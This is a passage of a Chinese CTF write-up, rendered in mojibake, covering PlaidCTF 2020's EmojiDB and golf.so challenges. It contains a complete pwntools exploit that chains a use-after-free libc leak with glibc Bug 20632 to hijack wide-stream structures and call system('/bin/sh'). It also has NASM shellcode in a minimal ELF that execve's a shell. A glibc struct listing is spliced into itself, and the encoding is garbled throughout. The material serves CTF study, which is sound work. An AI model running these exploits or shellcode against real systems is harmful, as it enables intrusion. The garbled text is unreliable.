
# å‡ é“åˆ©ç”¨ç‚¹è¾ƒä¸ºå°‘è§çš„é¢˜ç›®å¤ç°


                                é˜…è¯»é‡ Â Â 
                                **330101**
                            
                        |
                        
                                                                                                                                    ![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/203685/t01ed9e4091888ac664.jpg)](./img/203685/t01ed9e4091888ac664.jpg)



## 0x01 ç®€è¿°
1. [2020 PlaidCTF] EmojiDB â€“ 250ptï¼šä¸»è¦æ˜¯å¯¹`IO`å†…ç½®å‡½æ•°çš„åˆ©ç”¨ï¼Œåˆ›æ–°æ€§çš„åˆ©ç”¨äº†`Bug 20632`å®Œæˆæ”»å‡»ã€‚
1. [2020 PlaidCTF] golf.so â€“ 500ptï¼šä¸»è¦è€ƒå¯Ÿå¦‚ä½•æ„å»ºä¸€ä¸ªMiniå…±äº«åº“æ–‡ä»¶ã€‚
1. [2020 DawgCTF] Tik Tok â€“ 500ptï¼šåŸºæœ¬æ²¡æœ‰æ˜é¢ä¸Šçš„æ¼æ´ï¼Œä¸»è¦è€ƒå¯Ÿç¨‹åºçš„é€»è¾‘æ¼æ´ï¼Œè¿™äº›é€»è¾‘æ¼æ´ä¼šç›´æ¥å¯¼è‡´ä¸€äº›çœ‹ä¼¼æ­£å¸¸çš„é€»è¾‘å´ç»™ä¸æ”»å‡»è€…å¯ä¹˜ä¹‹æœºã€‚
1. [2020 DawgCTF 2020] Nash/Nash2ï¼šè¿™ä¸ªé¢˜ç›®çš„åˆ©ç”¨ç‚¹ä¸ºæœ‰é™çš„å‘½ä»¤æ‰§è¡Œã€‚


## 0x02 [2020 PlaidCTF] EmojiDB â€“ 250pt

> é¢˜ç›®ç±»å‹ï¼šPwn
<p>checksecç»“æœï¼š<br>
Arch: amd64-64-little<br>
RELRO: Full RELRO<br>
Stack: Canary found<br>
NX: NX enabled<br>
PIE: PIE enabled<br>
FORTIFY: Enabled</p>

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>é¢˜ç›®åˆ†æ

é¦–å…ˆï¼Œé¢˜ç›®ä¸ä»…ä»…ç»™å‡ºäº†é¢˜ç›®æºæ–‡ä»¶ï¼Œè¿˜ç»™å‡ºäº†é¢˜ç›®çš„`Dockerfile`ä»¥åŠ`start.sh`

```
FROM ubuntu:18.04

RUN apt-get update
RUN apt-get install -y xinetd
RUN apt-get install -y language-pack-en

RUN useradd -m ctf

COPY bin /home/ctf
COPY emojidb.xinetd /etc/xinetd.d/emojidb

RUN chown -R root:root /home/ctf
EXPOSE 9876
CMD ["/home/ctf/start.sh"]
```

```
#!/bin/sh
# Add your startup script

# DO NOT DELETE
/etc/init.d/xinetd start;
sleep infinity;

# In /etc/init.d/xinetd

service emojidb
{
    disable = no
    socket_type = stream
    protocol    = tcp
    wait        = no
    user        = ctf
    type        = UNLISTED
    port        = 9876
    bind        = 0.0.0.0
    server      = /home/ctf/run.sh
    # safety options
    per_source  = 10 # the maximum instances of this service per source IP address
    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use
    #rlimit_as  = 1024M # the Address Space resource limit for the service
}

# In /home/ctf/run.sh

#!/bin/sh
exec /home/ctf/emojidb 2&gt;&amp;-
```

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"></a>ç¨‹åºé€»è¾‘

é¦–å…ˆç¨‹åºæä¾›äº†äº”ä¸ªåŠŸèƒ½ï¼š
<li>
`book`çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š
<pre><code class="lang-c hljs cpp">struct book{
    int inuse;
    _QWORD *content;
}
</code></pre>
</li>
1. åˆ›å»º`book content`(å‘½ä»¤ï¼šğŸ†•)ï¼šéå†æ•´ä¸ª`book_list`ï¼Œå–å‡ºç©ºé—²ä½ç½®ä¸‹æ ‡ï¼Œé™åˆ¶ä¸‹æ ‡åªèƒ½ä»‹äº`0-4`ä¹‹é—´ï¼Œä¹Ÿå°±æ˜¯äº”ä¸ª`book`ï¼Œæ¥æ”¶ä¸€ä¸ª`size`ï¼Œæ£€æŸ¥`size`æ˜¯å¦å¤§äº`0x800`ï¼Œè‹¥ä¸å¤§äºï¼Œç”¨`calloc`åˆ›å»ºä¸€ä¸ª`4 * size`å¤§å°çš„`chunk`ï¼Œå°†`chunk`åœ°å€æ”¾åœ¨`book -&gt; content`çš„ä½ç½®ä¸Šï¼Œè®¾ç½®`book -&gt; inuse`ä½ä¸º`1`ï¼Œå‘`book -&gt; content`å†™å…¥`size`å¤§å°çš„å€¼ï¼Œè¿”å›ã€‚
1. æŸ¥çœ‹`book content`(å‘½ä»¤ï¼šğŸ“–)ï¼šè°ƒç”¨`get_book`å‡½æ•°æ¥æ”¶ä¸€ä¸ª`index`ï¼Œæ£€æŸ¥`index-1`æ˜¯å¦ä»‹äº`0-3`ä¹‹é—´ï¼Œå–å‡º`book_list[index - 1]`ï¼Œæ£€æŸ¥`book_list[index - 1] -&gt; content`æ˜¯å¦ä¸ºç©ºï¼Œè‹¥ä¸ä¸ºç©ºï¼Œæ‰“å°`book_list[index - 1] -&gt; content`ï¼Œè¿”å›ã€‚
1. åˆ é™¤`book content`(å‘½ä»¤ï¼šğŸ†“)ï¼šè°ƒç”¨`get_book`å‡½æ•°æ¥æ”¶ä¸€ä¸ª`index`ï¼Œæ£€æŸ¥`index-1`æ˜¯å¦ä»‹äº`0-3`ä¹‹é—´ï¼Œå–å‡º`book_list[index - 1]`ï¼Œæ£€æŸ¥`book_list[index - 1] -&gt; content`å’Œ`book_list[index - 1] -&gt; inuse`ï¼Œè‹¥`book_list[index - 1] -&gt; content`ä¸ä¸ºç©ºä¸”`book_list[index - 1] -&gt; inuse`é`0`ï¼Œé‡Šæ”¾`book_list[index - 1] -&gt; content`ï¼Œæ ‡è®°`book_list[index - 1] -&gt; inuse`ä¸º`0`ï¼Œè¿”å›ã€‚
1. é€€å‡º(å‘½ä»¤ï¼šğŸ›‘)ï¼šè°ƒç”¨`_exit(0);`ã€‚
1. æ‰“å°flag(éšè—åŠŸèƒ½ï¼Œå‘½ä»¤ï¼šğŸš©)ï¼šæ‰“å°ğŸ´ğŸğŸ³ã€‚
### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>æ¼æ´åˆ†æ
1. é¦–å…ˆå¾ˆæ˜æ˜¾çš„ï¼Œåœ¨åˆ é™¤`book content`ä¸­ï¼Œæ²¡æœ‰åœ¨é‡Šæ”¾`book_list[index - 1] -&gt; content`åæ ‡è®°`book_list[index - 1] -&gt; content`ä¸º`0`ï¼Œé€ æˆäº†`Use-After-Free`æ¼æ´ï¼Œä½†æ˜¯ç”±äº`book_list[index - 1] -&gt; inuse`çš„å­˜åœ¨ï¼Œåˆå¾ˆå¥½åœ°é¿å…äº†`Double Free`æ¼æ´çš„å‘ç”Ÿã€‚
<li>ç„¶ååœ¨åˆ›å»º`book content`æ—¶ï¼Œæ²¡æœ‰å¾ˆå¥½çš„æ§åˆ¶ä¸‹æ ‡ï¼Œé€ æˆæˆ‘ä»¬å¯ä»¥é¢å¤–ç”³è¯·ä¸€ä¸ªä¸‹æ ‡ä¸º`4`çš„`chunk`ï¼Œè¿™å°†å¯¼è‡´æˆ‘ä»¬å¯ä»¥å¼‚å¸¸çš„è¦†ç›–`0x2020E0`çš„å€¼ã€‚[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_91_/t01928b173b5265e360.png)
</li>
<li>å½“`0x2020E0`çš„å€¼éé›¶æ—¶ï¼Œè‹¥æˆ‘ä»¬è¾“å…¥äº†éæ³•çš„é€‰é¡¹ï¼Œç¨‹åºä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„é€‰é¡¹è¾“å‡ºåˆ°`stderr`æµã€‚[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01db7315d11ef001aa.png)å¹¶ä¸”ï¼Œåœ¨`run.sh`ä¸­ï¼Œç¨‹åºç‰¹æ„é™„åŠ äº†`2&gt;&amp;-`é€‰é¡¹ï¼Œè¿™è¡¨ç¤ºå…³é—­`stderr`ï¼Œè¿™éå¸¸å¯ç–‘ï¼
</li>
1. å®½å­—èŠ‚ç¯å¢ƒ+`stderr`è¢«å…³é—­ï¼Œæ°å¥½æ»¡è¶³äº†`Bug 20632`çš„åˆ©ç”¨è¦ä»¶ã€‚
### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>æ¼æ´åˆ©ç”¨

#### <a class="reference-link" name="Leak%20Data"></a>Leak Data

é¦–å…ˆï¼Œæ—¢ç„¶å­˜åœ¨`Use-After-Free`æ¼æ´ï¼Œä¸”ç¨‹åºåœ¨è°ƒç”¨`show book`æ—¶å¹¶æ²¡æœ‰æ£€æŸ¥`book_list[index - 1] -&gt; content`ï¼Œè¿™å°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªåˆ©ç”¨çš„æœºä¼šï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹è¿›è¡Œä¿¡æ¯çš„æ³„éœ²ã€‚

ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªé¢˜çš„æ‰€æœ‰`I/O`éƒ½ä½¿ç”¨äº†**å®½å­—èŠ‚`I/O`**ï¼Œä¾‹å¦‚`__wprintf_chk()`ã€`__isoc99_wscanf()`ã€`fgetws()`ã€`fputws()`ã€‚

é‚£ä¹ˆæˆ‘ä»¬çš„äº¤äº’å‡½æ•°å°±è¦è¿›è¡Œä¸€äº›æ”¹å˜ï¼Œæ”¹æˆå¦‚ä¸‹å½¢å¼ï¼š(æ­¤å¤„æ„Ÿè°¢å—æ¢¦ç‹®è™çš„å¸®åŠ©ï¼‰

```
from pwn import *
......

opcode = {
        '0x1F195':'xF0x9Fx86x95',# new
        '0x1F4D6':"xF0x9Fx93x96",# show
        '0x1F193':"xF0x9Fx86x93",# free
        '0x1F6A9':"xF0x9Fx9AxA9",# flag
}
......
def create(sh,chunk_size,value):
    sh.recvuntil("xe2x9dx93")
    sh.send(opcode["0x1F195"])
    sh.sendafter("xf0x9fx93x8fxe2x9d",str(chunk_size))
    sh.recvuntil("x93")
    sh.send(value)

def show(sh,index):
    sh.recvuntil("xe2x9dx93")
    sh.send(opcode['0x1F4D6'])
    sh.sendlineafter("xe2x9dx93",str(index+1))

def delete(sh,index):
    sh.recvuntil("xe2x9dx93")
    sh.send(opcode["0x1F193"])
    sh.sendlineafter("xe2x9dx93",str(index+1))
    sh.recvuntil("x9fx98xb1")

def flags(sh):
    sh.recvuntil("xe2x9dx93")
    sh.send(opcode["0x1F6A9"])
```

å¹¶ä¸”æˆ‘ä»¬åœ¨ä¹‹åçš„æ³„éœ²å’Œå†™å€¼éƒ½éœ€è¦ä½¿ç”¨å®½å­—èŠ‚äº¤äº’ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨[@Hatena](https://github.com/Hatena)å¤§ä½¬æä¾›çš„è„šæœ¬ï¼š

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;locale.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char **argv) {
  int i;
  unsigned char out[0x10] = {0};
  unsigned char in[0x10] = {0};
  setlocale(0, "en_US.UTF-8");

  if (argc &lt; 2) {
    printf("Usage: %s [1|2]n", argv[0]);
    return 1;
  }

  if (argv[1][0] == '1') {
    read(0, in, 0x10);
    mbstowcs((wchar_t*)out, in, 0x10);
    write(1, out, 8);
  } else {
    read(0, in, 8);
    wcstombs(out, (wchar_t*)in, 0x10);
    write(1, out, 0x10);
  }
  return 0;
}
```

ç„¶åæˆ‘ä»¬åœ¨pythonä¸­è¿™æ ·è°ƒç”¨ï¼š

```
def wchar2char(wchar_data):
    convert = process(['./convert','1'])
    convert.send(wchar_data)
    char_data = convert.recvrepeat(0.3)
    convert.close()
    return char_data

def char2wchar(char_data):
    convert = process(['./convert','2'])
    convert.send(char_data)
    wchar_data = convert.recvrepeat(0.3).strip('n').strip('x00')
    convert.close()
    return wchar_data
```

é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å…ˆ`leak libc`ï¼Œæ³„éœ²ä»£ç å¦‚ä¸‹

```
create(sh,0x110,'Chunk__0'+'n')
create(sh,0x10,'Chunk__0'+'n')
delete(sh,0)
libc_address = u64(wchar2char(show(sh,0)).ljust(8,'x00')) - get_main_arena(libc) - 0x60
success('The libc address is ' + hex(libc_address))
```

#### <a class="reference-link" name="Stack%20Overflow"></a>Stack Overflow

è¿™é‡Œåˆ©ç”¨çš„æ˜¯åœ¨`Sourceware Bugzilla`æŠ¥å‘Šçš„[`Bug 20632` ](https://www.sourceware.org/bugzilla/show_bug.cgi?id=20632)ï¼Œæ­£å¦‚æ¼æ´æ–‡ç« ä¸­è¯´æ˜çš„ï¼Œåœ¨å®½å­—èŠ‚ç¯å¢ƒä¸‹ä¸”`stderr`å·²è¢«å…³é—­æ—¶ï¼Œå¯èƒ½å‘ç”Ÿæ¼æ´ã€‚

æˆ‘ä»¬æ¥æ¢æµ‹å®é™…æ¼æ´çš„è§¦å‘ï¼š

```
create(sh,0x10,'Chunk__0'+'n')
create(sh,0x10,'Chunk__2'+'n')
create(sh,0x10,'Chunk__3'+'n')
create(sh,0x10,'Chunk__4'+'n')

payload = char2wchar(p32(0x12341234)) * 20
success('The libc address is ' + hex(libc.address))
get_gdb(sh,stop=True)
sh.sendlineafter(b"xe2x9dx93", payload)

sh.interactive()
```

é¦–å…ˆå½“æˆ‘ä»¬åœ¨`STDERR`è¢«å…³é—­æ—¶ï¼Œé¦–æ¬¡æ‰§è¡Œ`__fwprintf_chk(stderr, 1, '%lc', 0x12341234);`æ—¶ï¼Œå¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ï¼Œç”±äº`STDERR`è¢«å…³é—­ï¼Œå¯¼è‡´`_IO_wide_data_2`çš„æ‰€æœ‰é¡¹åŸºæœ¬å‡ä¸ºç©ºï¼š

```
gefâ¤  p _IO_wide_data_2
$1 = {
  _IO_read_ptr = 0x0, 
  _IO_read_end = 0x0, 
  _IO_read_base = 0x0, 
  _IO_write_base = 0x0, 
  _IO_write_ptr = 0x0, 
  _IO_write_end = 0x0, 
  _IO_buf_base = 0x0, 
  _IO_buf_end = 0x0, 
  _IO_save_base = 0x0, 
  _IO_backup_base = 0x0, 
  _IO_save_end = 0x0, 
  _IO_state = {
    __count = 0x0, 
    __value = {
      __wch = 0x0, 
      __wchb = "000000"
    }
  }, 
  _IO_last_state = {
    __count = 0x0, 
    __value = {
      __wch = 0x0, 
      __wchb = "000000"
    }
  }, 
  _codecvt = {
    __codecvt_destr = 0x0, 
    __codecvt_do_out = 0x0, 
    __codecvt_do_unshift = 0x0, 
    __codecvt_do_in = 0x0, 
    __codecvt_do_encoding = 0x0, 
    __codecvt_do_always_noconv = 0x0, 
    __codecvt_do_length = 0x0, 
    __codecvt_do_max_length = 0x0, 
    __cd_in = {
      __cd = {
        __nsteps = 0x0, 
        __steps = 0x0, 
        __data = 0x7f6f5ca9a838 &lt;_IO_wide_data_2+184&gt;
      }, 
      __combined = {
        __cd = {
          __nsteps = 0x0, 
          __steps = 0x0, 
          __data = 0x7f6f5ca9a838 &lt;_IO_wide_data_2+184&gt;
        }, 
        __data = {
          __outbuf = 0x0, 
          __outbufend = 0x0, 
          __flags = 0x0, 
          __invocation_counter = 0x0, 
          __internal_use = 0x0, 
          __statep = 0x0, 
          __state = {
            __count = 0x0, 
            __value = {
              __wch = 0x0, 
              __wchb = "000000"
            }
          }
        }
      }
    }, 
    __cd_out = {
      __cd = {
        __nsteps = 0x0, 
        __steps = 0x0, 
        __data = 0x7f6f5ca9a878 &lt;_IO_wide_data_2+248&gt;
      }, 
      __combined = {
        __cd = {
          __nsteps = 0x0, 
          __steps = 0x0, 
          __data = 0x7f6f5ca9a878 &lt;_IO_wide_data_2+248&gt;
        }, 
        __data = {
          __outbuf = 0x0, 
          __outbufend = 0x0, 
          __flags = 0x0, 
          __invocation_counter = 0x0, 
          __internal_use = 0x0, 
          __statep = 0x0, 
          __state = {
            __count = 0x0, 
            __value = {
              __wch = 0x0, 
              __wchb = "000000"
            }
          }
        }
      }
    }
  }, 
  _shortbuf = L"", 
  _wide_vtable = 0x7f6f5ca96d60 &lt;_IO_wfile_jumps&gt;
}
```

ä½†æ˜¯ï¼Œæˆ‘ä»¬è‹¥ç»§ç»­è¿è¡Œï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆ

```
/* Write formatted output to FP from the format string FORMAT.  */
int __fwprintf_chk (FILE *fp, int flag, const wchar_t *format, ...)
{
    va_list ap;
    int done;
    _IO_acquire_lock_clear_flags2(fp);
    if (flag &gt; 0)
        fp-&gt;_flags2 |= _IO_FLAGS2_FORTIFY;

    va_start (ap, format);
    done = _IO_vfwprintf (fp, format, ap);
    va_end (ap);

    if (flag &gt; 0)
        fp-&gt;_flags2 &amp;= ~_IO_FLAGS2_FORTIFY;
    _IO_release_lock (fp);

    return done;
}
```

å‘ç°åœ¨`_IO_vfwprintf`è¿è¡Œç»“æŸåï¼Œ`_IO_wide_data_2`çš„`_IO_write_ptr`å·²è¢«æ¢å¤ï¼Œå¹¶ä¸”å¯ä»¥å‘ç°ï¼Œå®ƒçš„`_IO_write_ptr`æŒ‡å‘çš„æ˜¯`_IO_wide_data_2`æœ«å°¾ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å»å°è¯•è¦†ç›–æ‰`_IO_wide_data_1`çš„å€¼å¹¶åŠ«æŒ`STDOUT`ç»“æ„ä½“ã€‚

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_912_/t01e5bff6a45b266a8f.png)

æŸ¥çœ‹åç§»

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_439_/t019e0fb82097a78ee4.png)

æ¥ä¸‹æ¥ç»§ç»­è¿è¡Œäº”æ¬¡ï¼ŒæŸ¥çœ‹å†…å­˜

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_640_/t01039a3b6b74b5e967.png)

å¯ä»¥å‘ç°ï¼Œçš„ç¡®æ˜¯å¯ä»¥æˆåŠŸè¦†ç›–åˆ°`_IO_wide_data_1`çš„å†…å®¹çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æœ€ç»ˆåˆ©ç”¨æ€è·¯å°±æ˜¯ç¯¡æ”¹`do_out`å‡½æ•°æŒ‡é’ˆï¼Œ`do_out`å‡½æ•°åœ¨`/glibc-2.27/source/libio/iofwide.c#L155`ä¸­å®šä¹‰ï¼Œæˆ‘ä»¬ä»…éœ€è¦çœ‹å…¶å‡½æ•°åŸå‹å³å¯ï¼š

```
static enum __codecvt_result do_out (struct _IO_codecvt *codecvt, __mbstate_t *statep,
    const wchar_t *from_start, const wchar_t *from_end,
    const wchar_t **from_stop, char *to_start, char *to_end,
    char **to_stop)

```

è€Œæˆ‘ä»¬æœ€ç»ˆçš„`IO`ç»“æ„ä½“å¦‚ä¸‹ï¼Œæˆ‘ä»¬æ°å¥½å¯ä»¥åŠ«æŒæ•´ä¸ª`_codecvt`ç»“æ„ä½“ã€‚

```
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;
# endif
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;
# endif
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};
```

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_640_/t0150e853386ec239bb.png)

é€šè¿‡åç§»è®¡ç®—ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ å¦‚ä¸‹è¾“å…¥

```
IO_wide_data = libc.address + 0x3eb9e8
info("IO_wide_data = " + hex(IO_wide_data))

payload = ''
for i in range(16):
    payload += char2wchar(p32(IO_wide_data % 0x100000000))
    payload += char2wchar(p32(IO_wide_data &gt;&gt; 32))

payload += char2wchar(b'/bin') + char2wchar(b'/sh')
payload += char2wchar(p32(libc.symbols['system'] % 0x100000000))
payload += char2wchar(p32(libc.symbols['system'] &gt;&gt; 32))
```

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_640_/t01f224e1a5bdb38f87.png)

æˆåŠŸget shell

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'
opcode = {
        '0x1F4D6':"xF0x9Fx93x96",#show
        '0x1F6A9':"xF0x9Fx9AxA9",
        '0x1F193':"xF0x9Fx86x93",#free
        '0x1F195':'xF0x9Fx86x95',#new
}

emojidb=ELF('./emojidb', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./run.sh")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./run.sh")

def get_main_arena(self):
    """Find main_arena offset
    Returns:
        int: Offset to main_arena (returns None if it's not libc)
    """
    ofs_realloc_hook = self.symbols['__realloc_hook']
    ofs_malloc_hook = self.symbols['__malloc_hook']
    if ofs_realloc_hook is None or ofs_malloc_hook is None:
        log.error('main_arena works only for libc binaries')
        return None

    if context.arch == 'i386':
        return ofs_malloc_hook + 0x18
    else:
        return ofs_malloc_hook + (ofs_malloc_hook - ofs_realloc_hook) * 2

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def create(sh,chunk_size,value):
    sh.recvuntil("xe2x9dx93")
    sh.send(opcode["0x1F195"])
    sh.sendafter("xf0x9fx93x8fxe2x9d",str(chunk_size))
    sh.recvuntil("x93")
    sh.send(value)

def show(sh,index):
    sh.recvuntil("xe2x9dx93")
    sh.send(opcode['0x1F4D6'])
    sh.sendlineafter("xe2x9dx93",str(index+1))
    return sh.recvline()

def delete(sh,index):
    sh.recvuntil("xe2x9dx93")
    sh.send(opcode["0x1F193"])
    sh.sendlineafter("xe2x9dx93",str(index+1))
    sh.recvuntil("x9fx98xb1")

def flags(sh):
    sh.recvuntil("xe2x9dx93")
    sh.send(opcode["0x1F6A9"])

def wchar2char(wchar_data):
    convert = process(['./convert','1'])
    convert.send(wchar_data)
    char_data = convert.recvrepeat(0.3)
    convert.close()
    return char_data

def char2wchar(char_data):
    convert = process(['./convert','2'])
    convert.send(char_data)
    wchar_data = convert.recvrepeat(0.3).strip('n').strip('x00')
    convert.close()
    return wchar_data

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        create(sh,0x110,'Chunk__0'+'n')
        create(sh,0x10,'Chunk__1'+'n')
        delete(sh,0)
        libc.address = u64(wchar2char(show(sh,0)).ljust(8,'x00')) - get_main_arena(libc) - 0x60
        if libc.address % 0x1000 != 0:
            error('The libc base address is wrong!')
        success('The libc base address is ' + hex(libc.address))
        create(sh,0x10,'Chunk__0'+'n')
        create(sh,0x10,'Chunk__2'+'n')
        create(sh,0x10,'Chunk__3'+'n')
        create(sh,0x10,'Chunk__4'+'n')

        IO_wide_data = libc.address + 0x3eb9e8
        info("IO_wide_data = " + hex(IO_wide_data))

        payload = ''
        for i in range(16):
            payload += char2wchar(p32(IO_wide_data % 0x100000000))
            payload += char2wchar(p32(IO_wide_data &gt;&gt; 32))

        payload += char2wchar(b'/bin') + char2wchar(b'/sh')
        payload += char2wchar(p32(libc.symbols['system'] % 0x100000000))
        payload += char2wchar(p32(libc.symbols['system'] &gt;&gt; 32))
        sh.sendlineafter(b"xe2x9dx93", payload)
        flag=get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
```



## 0x03 [2020 PlaidCTF] golf.so â€“ 500pt

> é¢˜ç›®ç±»å‹ï¼šMisc

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E7%9B%AE%E7%9A%84"></a>é¢˜ç›®ç›®çš„

é¢˜ç›®ç›®çš„æ˜¯æ„å»ºä¸€ä¸ª`Mini-shared object`ï¼Œä½¿è¿™ä¸ªå…±äº«åº“å¯ä»¥è¢«åŠ è½½åˆ°`/bin/true`æ—¶ï¼Œæ‰§è¡Œ`execve("/bin/sh",["/bin/sh"],...)`ã€‚

### æ„å»º`Mini-elf`

äº‹å®ä¸Šï¼Œå¯¹äºä¸€ä¸ªæœ€å°çš„ELFæ–‡ä»¶ï¼Œåªéœ€è¦å®šä¹‰ä¸€ä¸ªç¨‹åºæ ‡å¤´ï¼Œä¸”åœ¨ç¨‹åºæ ‡å¤´å†…å°†æ•´ä¸ªç¨‹åºåŠ è½½åˆ°å†…å­˜å¹¶æ‰§è¡Œå³å¯ã€‚

```
; My_test.s
BITS 64

    org     0x00400000
ehdr:
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db      0
            dw      3                               ;   e_type
            dw      62                              ;   e_machine
            dd      1                               ;   e_version
            dq      _start                          ;   e_entry
            dq      phdr - $$                       ;   e_phoff
            dq      0                               ;   e_shoff
            dd      0                               ;   e_flags
            dw      ehdrsize                        ;   e_ehsize
            dw      phdrsize                        ;   e_phentsize
            dw      1                               ;   e_phnum
            dw      0                               ;   e_shentsize
            dw      0                               ;   e_shnum
            dw      0                               ;   e_shstrndx

ehdrsize      equ     $ - ehdr

phdr:                                                 ; Elf64_Phdr
            dd      1                               ;   p_type
            dd      5                               ;   p_flags
            dq      0                               ;   p_offset
            dq      $$                              ;   p_vaddr
            dq      $$                              ;   p_paddr
            dq      filesize                        ;   p_filesz
            dq      filesize                        ;   p_memsz
            dq      0x1000                          ;   p_align

phdrsize      equ     $ - phdr

_start:
    xor rsi,rsi
    cdq
    push rsi

      mov rdi , 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi

    push rsi
    push rdi
    push rsp
    pop rsi 

    push 0x3b
    pop rax
    syscall

filesize      equ     $ - $$
```

ä½¿ç”¨`nasm -f bin -o a.out My_test.s`å‘½ä»¤ç¼–è¯‘

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_123_/t012b57eebd9acb0a52.png)

å¯ä»¥å‘ç°ï¼Œå®ƒç°åœ¨ä»…æœ‰147ä¸ªå­—èŠ‚ã€‚

### æ„å»º`Mini-shared object`

æ¥ä¸‹æ¥éœ€è¦æ„å»ºä¸€ä¸ªå…±äº«åº“æ–‡ä»¶ï¼Œå¯¹äºå…±äº«åº“æ–‡ä»¶ï¼Œ[ELFè§„èŒƒ](https://uclibc.org/docs/elf-64-gen.pdf)è¦æ±‚æœ‰ä¸¤ä¸ªç¨‹åºæ ‡å¤´ï¼Œåˆ†åˆ«å®šä¹‰ä¸€ä¸ª`LOADable`æ®µå’Œä¸€ä¸ª`DYNAMIC`æ®µï¼Œå¹¶ä¸”æ¥ä¸‹æ¥è¦æ±‚æœ‰å››ä¸ªç¨‹åºèŠ‚åŒºï¼Œåˆ†åˆ«æ˜¯ï¼š
<li>
`SYMTAB`èŠ‚ï¼šç”¨äºå­˜æ”¾æˆ‘ä»¬éœ€è¦è¦†ç›–çš„ç¬¦å·ã€‚</li>
<li>
`STRTAB`èŠ‚ï¼šç”¨äºå­˜æ”¾æˆ‘ä»¬æ‰€éœ€è¦çš„å­—ç¬¦ä¸²ã€‚</li>
<li>
